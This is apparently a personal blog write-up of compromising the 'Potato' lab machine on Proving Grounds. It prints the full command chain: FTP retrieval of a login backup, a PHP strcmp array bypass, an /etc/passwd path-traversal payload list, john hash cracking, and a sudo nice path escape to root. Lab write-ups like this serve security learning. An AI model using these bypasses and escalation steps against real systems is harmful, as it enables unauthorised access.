+++
title = "Potato on Proving Grounds Write-up"
author = ["funcsec"]
date = 2022-01-23
publishDate = 2022-01-23
lastmod = 2022-01-23T19:34:30-08:00
tags = ["linux", "ftp", "php", "lfi", "sudo"]
categories = ["writeup", "redteam"]
draft = false
toc = "true +"
omit_header_text = "+"
background_color_class = "bg-black-60"
description = "A Write-up of the Potato box on Proving grounds"
featured_image = "images/josepf-kinzel_the-potato-harvest.jpg"
images = ["images/josepf-kinzel_the-potato-harvest.jpg"]
+++

What I liked most about this box was using information gained in the enumeration of one service to compromise other services.
This was the first on Proving Grounds, besides getting kicked off their VPN a number of times for taking my sweet time, I found the box quite fun.

---


## Executive Summary {#executive-summary}

The target server had broken access control for a file transfer service that gave away an insecure design vulnerability in the web login form.
This gave user level access to the target machine.
A privilege escalation was possible due to a improper access control of a scheduling utility allowing for a full box access.


## Methodology {#methodology}

The first step in this penetration test engagement was to enumeration the target machine in the scope.


### Enumeration {#enumeration}

Enumeration was begun with `nmap`.
This checked for open ports, services, and service versions.

```bash
nmap -sV -sC -A $ip
```

```text
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-18 22:56 EST
Nmap scan report for 192.168.224.101
Host is up (0.070s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
|_  256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Potato company
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.65 seconds
```

There was a `2112` port responding to FTP.

```bash
nmap -p 2112 -sV -sC -A $ip
```

```text
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-18 23:36 EST
Nmap scan report for 192.168.224.101
Host is up (0.068s latency).

PORT     STATE SERVICE VERSION
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.74 seconds
```

This open FTP port allowed for anonymous login and contained two files.
The following steps pulled down and displayed those files.

```bash
#!/bin/bash
set -euo pipefail
IP=$ip
PORT=2112
USER="anonymous"
PASS="anonymous"

ftp -inv -P $PORT $IP <<EOF
user $USER $PASS
pass
get index.php.bak
bye
EOF
echo ""
cat index.php.bak
```

```text
Connected to 192.168.224.101.
220 ProFTPD Server (Debian) [::ffff:192.168.224.101]
331 Anonymous login ok, send your complete email address as your password
230-Welcome, archive user anonymous@192.168.49.224 !
230-
230-The local time is: Wed Jan 19 04:41:05 2022
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
Passive mode: off; fallback to active mode: off.
local: index.php.bak remote: index.php.bak
200 EPRT command successful
150 Opening BINARY mode data connection for index.php.bak (901 bytes)
     0        0.00 KiB/s    901        2.20 MiB/s
226 Transfer complete
901 bytes received in 00:00 (12.88 KiB/s)
221 Goodbye.

<html>
<head></head>
<body>

<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>


  <form action="index.php?login=1" method="POST">
                <h1>Login</h1>
                <label><b>User:</b></label>
                <input type="text" name="username" required>
                </br>
                <label><b>Password:</b></label>
                <input type="password" name="password" required>
                </br>
                <input type="submit" id='submit' value='Login' >
  </form>
</body>
</html>

```

The first file appeared to be the authentication code for a web login and a potential username and password of `admin:potato`.

```bash
#!/bin/bash
set -euo pipefail
IP=$ip
PORT=2112
USER="anonymous"
PASS="anonymous"

ftp -inv -P $PORT $IP <<EOF
user $USER $PASS
pass
get welcome.msg
bye
EOF
echo ""
cat welcome.msg
```

```text
Connected to 192.168.224.101.
220 ProFTPD Server (Debian) [::ffff:192.168.224.101]
331 Anonymous login ok, send your complete email address as your password
230-Welcome, archive user anonymous@192.168.49.224 !
230-
230-The local time is: Wed Jan 19 04:48:02 2022
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
Passive mode: off; fallback to active mode: off.
local: welcome.msg remote: welcome.msg
200 EPRT command successful
150 Opening BINARY mode data connection for welcome.msg (54 bytes)
     0        0.00 KiB/s     54      396.49 KiB/s
226 Transfer complete
54 bytes received in 00:00 (0.76 KiB/s)
221 Goodbye.

Welcome, archive user %U@%R !

The local time is: %T

```

The second file was a simple welcome message with nothing interesting.
Further enumeration is needed to find where to use these credentials.
The web server seemed like a good next step.

```bash
gobuster dir -u http://$ip:80 -w /usr/share/dirb/wordlists/common.txt
```

```text
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.107.101:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/19 23:53:13 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/admin                (Status: 301) [Size: 318] [--> http://192.168.107.101/admin/]
/.hta                 (Status: 403) [Size: 280]
/index.php            (Status: 200) [Size: 245]
/server-status        (Status: 403) [Size: 280]
===============================================================
2022/01/19 23:53:48 Finished
===============================================================
```

The `/admin` page contained a login form that could potentially be the exploitation point to use a `strcmp` exploit that was found in the ftp service.


### Exploitation {#exploitation}

From the `index.php.bak` page.

```php
if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
```

Using `strcmp`  for a string validation is exploitable.
With Burpsuite the `password` variable can be turned into an array.
That array will be evaluated to a `NULL`, which will become a `O` due to a bug in using `==`.

```text
POST /admin/index.php?login=1 HTTP/1.1
Host: 192.168.107.101
Content-Length: 32
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.107.101
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.107.101/admin/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh
Connection: close

username=admin&password=password
```

The way this was done was by changing the POST request.

```diff
-username=admin&password=password
+username=admin&password[]=""
```

{{< figure src="/ox-hugo/potato-welcome.png" caption="<span class=\"figure-number\">Figure 1: </span>Successful login" >}}

This gave access to the back end of the site.
The pages seemed to have local file inclusion vulnerabilities.
This was tested with Burpsuite by supplying a series of relative paths to the `passwd` file in Burpsuite intruder.

```text
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
```

`§log_01.txt§` replaced with the relative paths above.
That should have covered a web application 7 layers deep.

```text
POST /admin/dashboard.php?page=log HTTP/1.1
Host: 192.168.107.101
Content-Length: 15
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.107.101
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.107.101/admin/dashboard.php?page=log
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh
Connection: close

file=§log_01.txt§
```

This was successful in displaying the contents of the `/etc/password` file.

{{< figure src="/ox-hugo/potato_lfi-passwd.png" caption="<span class=\"figure-number\">Figure 2: </span>LFI display of `/etc/passwd`" >}}

At the bottom of the file is the `webadmin` hash.
This was already in the correct format to feed into `john` to crack the hash.

```bash
echo 'webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash' > /tmp/crack
$(cd /tmp; tar -xzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz)
john --wordlist=/tmp/rockyou.txt /tmp/crack
```

```text
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
dragon           (webadmin)
1g 0:00:00:00 DONE (2022-01-20 01:38) 100.0g/s 19200p/s 19200c/s 19200C/s 123456..november
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

So the password for the `webadmin` user was `dragon`.
That username and password combination was used against the `ssh` service running on port 22.

```text
kali@kali-vm:/tmp$ ssh webadmin@$ip

webadmin@serv:~$ whoami
webadmin
```

The username and password combination was successful in logging into the ssh service.
In the home directory of the `webadmin` user was a flag called `local.txt`.

```text
webadmin@serv:~$ cat local.txt
[[ REDACTED ]]
```


### Privilege Escalation {#privilege-escalation}

The next step was to try to gain privilege escalation to the root user.
Sometimes there can be issues with the `SUID` permission on some executable files that can allow for unintended root access.
Scanning for this vulnerability is done with the `find` command.

```text
webadmin@serv:/notes$   find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-xr-x 1 root root 55528 Apr  2  2020 /usr/bin/mount
-rwsr-xr-x 1 root root 166056 Feb  3  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 88464 Apr 16  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39144 Apr  2  2020 /usr/bin/umount
-rwsr-xr-x 1 root root 31032 Aug 16  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 85064 Apr 16  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 44784 Apr 16  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 67816 Apr  2  2020 /usr/bin/su
-rwsr-xr-x 1 root root 53040 Apr 16  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 68208 Apr 16  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 473576 May 29  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 130152 Jul 10  2020 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 110792 Sep  4  2020 /snap/snapd/9279/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 110792 Jul 10  2020 /snap/snapd/8542/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 43088 Mar  5  2020 /snap/core18/1885/bin/mount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1885/bin/ping
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/1885/bin/su
-rwsr-xr-x 1 root root 26696 Mar  5  2020 /snap/core18/1885/bin/umount
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/1885/usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/1885/usr/bin/chsh
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/1885/usr/bin/newgrp
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/1885/usr/bin/passwd
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 43088 Mar  5  2020 /snap/core18/1880/bin/mount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1880/bin/ping
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/1880/bin/su
-rwsr-xr-x 1 root root 26696 Mar  5  2020 /snap/core18/1880/bin/umount
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/1880/usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/1880/usr/bin/chsh
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/1880/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/1880/usr/bin/newgrp
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/1880/usr/bin/passwd
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /snap/core18/1880/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

There did not appear to be any `suid` permissions that were exploitable at first glance.
Another potential vector for privilege escalation is to see what executables the `webadmin` user might be able to run as `sudo`.

```text
webadmin@serv:~$ sudo -l
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*
```

It was curious that the scheduling utility `nice` had specific access to the `/notes` directory.
Investigation into the `/notes` directory did not yield anything interesting.
The `nice` utility could run executables beginning in the `notes` directory but was susceptible to being escaped out into another directory with `../`.
To get a `bash` shell, a small script was created in the user directory that was simply `/bin/bash`, but when run with root privilege it would be a privilege escalation.

```text
webadmin@serv:~$ echo "/bin/bash" > root.sh
webadmin@serv:~$ chmod +x root.sh
webadmin@serv:~$ sudo nice /notes/../home/webadmin/root.sh
root@serv:/home/webadmin# $ whoami
root
```

This was a successful privilege escalation.
The remaining step was to find the flag, which was in the `/root` directory.

```text
root@serv:/home/webadmin# cd
root@serv:~# ls
proof.txt  root.txt  snap
root@serv:~# cat root.txt
cat root.txt
Your flag is in another file...
root@serv:~# cat proof.txt
cat proof.txt
[[ REDACTED ]]
```

Final step was too show proof of `root` and the `ip addr` output.

```text
root@serv:~#   cat proof.txt && whoami && hostname && ip addr
[[ REDACTED ]]
root
serv
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:bf:d4:6d brd ff:ff:ff:ff:ff:ff
    inet 192.168.107.101/24 brd 192.168.107.255 scope global ens192
       valid_lft forever preferred_lft forever
```

That was a full compromise.

---

A very fun box. Still some kinks in my reporting.
I'm thinking of changing from the major heading of Methodolgy to Attack Narrative after seeing an sample Offensive Security Pentest report.
We shall see.